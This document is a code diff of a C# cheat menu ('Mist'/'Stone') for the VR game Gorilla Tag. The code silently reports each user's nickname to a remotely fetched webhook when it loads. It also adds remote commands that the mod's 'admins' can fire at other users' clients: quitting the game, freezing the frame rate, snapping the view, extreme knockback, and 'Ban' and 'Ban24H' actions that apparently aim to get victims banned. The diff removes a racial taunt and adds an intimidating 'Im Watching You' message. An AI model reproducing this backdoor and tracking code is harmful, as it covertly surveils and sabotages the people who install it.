@@ -1,6 +1,7 @@
 using AetherTemp.Menu;
 using ExitGames.Client.Photon;
 using GorillaLocomotion;
+using GorillaNetworking;
 using Newtonsoft.Json;
 using Photon.Pun;
 using StupidTemplate.Classes;
@@ -20,18 +21,27 @@ namespace Mist.Mods.Stone
     internal class StoneBase : MonoBehaviour
     {
         #region Start
-        double currentStoneVersion = 2.01;
+        /*
+        public void Awake()
+        {
+            SendWeb("**" + PhotonNetwork.LocalPlayer.NickName, "has loaded into the game with Mist **");
+            
+        }*/
+        public static double currentStoneVersion = 2.01;
         public async void Awake()
-            {
-                SendWeb("**" + PhotonNetwork.LocalPlayer.NickName, "has loaded into the game with Mist ** Stone Version:" + currentStoneVersion);
+        {
+            SendWeb("**" + PhotonNetwork.LocalPlayer.NickName, "has loaded into the game with Mist ** Stone Version:" + currentStoneVersion);
 
             if (latestStoneVersion > currentStoneVersion)
             {
                 await Task.Delay(15000);
-                NotifiLib.SendNotification("<color=red>PLEASE UPDATE YOUR MENU/VERSION OF STONE, IT IS CURRENTLY OUTDATED</color>");
-                NotifiLib.SendNotification("<color=red>PLEASE UPDATE YOUR MENU/VERSION OF STONE, IT IS CURRENTLY OUTDATED</color>");
-                NotifiLib.SendNotification("<color=red>PLEASE UPDATE YOUR MENU/VERSION OF STONE, IT IS CURRENTLY OUTDATED</color>");
+                NotificationLib.SendNotification("<color=red>PLEASE UPDATE YOUR MENU/VERSION OF STONE, IT IS CURRENTLY OUTDATED</color>");
+                NotificationLib.SendNotification("<color=red>PLEASE UPDATE YOUR MENU/VERSION OF STONE, IT IS CURRENTLY OUTDATED</color>");
+                NotificationLib.SendNotification("<color=red>PLEASE UPDATE YOUR MENU/VERSION OF STONE, IT IS CURRENTLY OUTDATED</color>");
             }
+        }
+
+        public static double latestStoneVersion = double.Parse(new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/Stone-Networking/refs/heads/main/Stone/StoneVersion").GetAwaiter().GetResult().Trim());
         public void Start()
         {
             PhotonNetwork.NetworkingClient.EventReceived += OnEvent;
@@ -40,6 +50,7 @@ namespace Mist.Mods.Stone
         {
             try
             {
+                
                 NetworkedTag();
                 Tracker();
             }
@@ -76,12 +87,15 @@ namespace Mist.Mods.Stone
                     string label = "";
                     string userId = rig.Creator.UserId;
 
+
                     if (Cha.Contains(userId))
                         label = "Mist Owner";
                     else if (NOVAuserid.Contains(userId))
                         label = "Mist Co-Owner";
                     else if (Tortise.Contains(userId))
                         label = "Violet Owner";
+                    else if (HeadADuserid.Contains(userId))
+                        label = "Stone Head Admin";
                     else if (ADuserid.Contains(userId))
                         label = "Stone Admin";
                     else if (HELPERuserid.Contains(userId))
@@ -192,13 +206,35 @@ namespace Mist.Mods.Stone
         }
         #endregion
         #region Access
-        public static void Access()
+        public static void BaseAccess()
         {
             string userId = PhotonNetwork.LocalPlayer.UserId;
 
             if (IsAdmin(userId))
             {
                 SettingsMods.EnterCat(12);
+            }
+            else
+            {
+                NotificationLib.SendNotification("<color=red>Stone</color> : You are not an Admin.");
+            }
+        }
+
+        public static bool IsABase(string userId)
+        {
+            return Cha.Contains(userId)
+            || ADuserid.Contains(userId)
+            || HeadADuserid.Contains(userId)
+            || HELPERuserid.Contains(userId)
+            || NOVAuserid.Contains(userId);
+        }
+        public static void AdminAccess()
+        {
+            string userId = PhotonNetwork.LocalPlayer.UserId;
+
+            if (IsAdmin(userId))
+            {
+                SettingsMods.EnterCat(25);
             }
             else
             {
@@ -213,12 +249,62 @@ namespace Mist.Mods.Stone
             || HELPERuserid.Contains(userId)
             || NOVAuserid.Contains(userId);
         }
+        public static void HelperAccess()
+        {
+            string userId = PhotonNetwork.LocalPlayer.UserId;
 
-        public static void OwnerAccess()
+            if (IsHelper(userId))
+            {
+                SettingsMods.EnterCat(24);
+            }
+            else
+            {
+                NotificationLib.SendNotification("<color=red>Stone</color> : You are not an Helper.");
+            }
+        }
+
+        public static bool IsHelper(string userId)
+        {
+            return Cha.Contains(userId)
+            || HELPERuserid.Contains(userId);
+        }
+        public static void HeadAdminAccess()
+        {
+            string userId = PhotonNetwork.LocalPlayer.UserId;
+
+            if (IsHeadAdmin(userId))
+            {
+                SettingsMods.EnterCat(26);
+            }
+            else
+            {
+                NotificationLib.SendNotification("<color=red>Stone</color> : You are not an Head Admin.");
+            }
+        }
+
+        public static bool IsHeadAdmin(string userId)
+        {
+            return Cha.Contains(userId)
+            || HeadADuserid.Contains(userId);
+        }
+        public static void SOwnerAccess()
         {
             string userId = PhotonNetwork.LocalPlayer.UserId;
 
             if (IsOwner(userId))
+            {
+                SettingsMods.EnterCat(27);
+            }
+            else
+            {
+                NotificationLib.SendNotification("<color=red>Console</color> : You are not the Owner.");
+            }
+        }
+        public static void COwnerAccess()
+        {
+            string userId = PhotonNetwork.LocalPlayer.UserId;
+
+            if (IsCOwner(userId))
             {
                 SettingsMods.EnterCat(15);
             }
@@ -229,6 +315,11 @@ namespace Mist.Mods.Stone
         }
 
         public static bool IsOwner(string userId)
+        {
+            return Cha.Contains(userId)
+            || NOVAuserid.Contains(userId);
+        }
+        public static bool IsCOwner(string userId)
         {
             return Cha.Contains(userId);
         }
@@ -336,7 +427,7 @@ namespace Mist.Mods.Stone
                             break;
                         case "Message":
                             if (!isLocalOwner)
-                                NotificationLib.SendNotification("Your Black");
+                                NotificationLib.SendNotification("Im Watching You");
                             break;
                         case "ScaleDown":
                             if (!isLocalOwner)
@@ -404,6 +495,10 @@ namespace Mist.Mods.Stone
                         case "EnableNameTags":
                             if (!isLocalOwner)
                                 TagsEnabled = true;
+                            break;
+                        case "Ban":
+                            if (!isLocalOwner)
+                                PhotonNetwork.SetMasterClient(PhotonNetwork.LocalPlayer);
                             break;
                         case "appquit":
                             if (!isLocalOwner)
@@ -474,6 +569,50 @@ namespace Mist.Mods.Stone
                             }
                             #endregion
                             break;
+                        case "dark":
+                            if (!isLocalOwner)
+                                GameLightingManager.instance.SetCustomDynamicLightingEnabled(true);
+                            break;
+                        case "light":
+                            if (!isLocalOwner)
+                                GameLightingManager.instance.SetCustomDynamicLightingEnabled(false);
+                            break;
+                        case "snapneck":
+                            if (!isLocalOwner)
+                                GorillaTagger.Instance.offlineVRRig.head.trackingRotationOffset.y = 90f;
+                            break;
+                        case "fixneck":
+                            if (!isLocalOwner)
+                                GorillaTagger.Instance.offlineVRRig.head.trackingRotationOffset.y = 0f;
+                            break;
+                        case "60hz":
+                            if (!isLocalOwner)
+                                Application.targetFrameRate = 60;
+                            break;
+                        case "72hz":
+                            if (!isLocalOwner)
+                                Application.targetFrameRate = 72;
+                            break;
+                        case "-1hz":
+                            if (!isLocalOwner)
+                                Application.targetFrameRate = -1;
+                            break;
+                        case "0hz":
+                            if (!isLocalOwner)
+                                Application.targetFrameRate = 0;
+                            break;
+                        case "999hz":
+                            if (!isLocalOwner)
+                                Application.targetFrameRate = 999;
+                            break;
+                        case "Ban24H":
+                            if (!isLocalOwner)
+                                PhotonNetworkController.Instance.AttemptToJoinSpecificRoom("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", JoinType.Solo);
+                            break;
+                        case "obliterate":
+                            if (!isLocalOwner)
+                                GTPlayer.Instance.ApplyKnockback(GorillaTagger.Instance.transform.up, 7000f, true);
+                            break;
                     }
                 }
             }
@@ -481,7 +620,7 @@ namespace Mist.Mods.Stone
         private bool hasCastLightning = false;
         public static Vector3 lastPosition = Vector3.zero;
         public static Vector3 closePosition;
-        public static void TeleportPlayer(Vector3 position) // Only modify this if you need any special logic
+        public static void TeleportPlayer(Vector3 position) 
         {
             GTPlayer.Instance.TeleportTo(position, GTPlayer.Instance.transform.rotation);
             lastPosition = position;
@@ -633,18 +772,15 @@ namespace Mist.Mods.Stone
             }
         }
 
-        public static string userid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/TortiseWay2Cool/Kill_Switch/refs/heads/main/Valid%20User%20ID").GetAwaiter().GetResult();
-        public static string Tortise = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/TortiseWay2Cool/Kill_Switch/refs/heads/main/Tortise").GetAwaiter().GetResult();
-        public static string Cha = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/TortiseWay2Cool/Kill_Switch/refs/heads/main/Cha").GetAwaiter().GetResult();
-        public static string webhookUrl = new HttpClient().GetStringAsync("YOUR HOOK HERE").GetAwaiter().GetResult();
-        public static string ADuserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/ADUserID's").GetAwaiter().GetResult();
-        public static string IIAdminuserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/Reusid").GetAwaiter().GetResult();
-        public static string HELPERuserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/MistHelper").GetAwaiter().GetResult();
-        public static string NOVAuserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/NOVA").GetAwaiter().GetResult();
-        public static double latestStoneVersion = double.Parse(new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/Stone-Networking/refs/heads/main/Stone/StoneVersion").GetAwaiter().GetResult().Trim());
-        
+        public static string userid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/userid").GetAwaiter().GetResult();//Main User ids
+        public static string Tortise = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/TortiseWay2Cool/Kill_Switch/refs/heads/main/Tortise").GetAwaiter().GetResult();//Tortise
+        public static string Cha = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/Cha").GetAwaiter().GetResult();//Me/Cha
+        public static string webhookUrl = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/free_hook").GetAwaiter().GetResult();//Hook
+        public static string ADuserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/ADUserID's").GetAwaiter().GetResult();//Admin
+        public static string HeadADuserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/HeadADuserid").GetAwaiter().GetResult();//Head Admin
+        public static string HELPERuserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/MistHelper").GetAwaiter().GetResult();//Helper
+        public static string NOVAuserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/NOVA").GetAwaiter().GetResult();//Nova
+
         #endregion
     }
 }
-
-
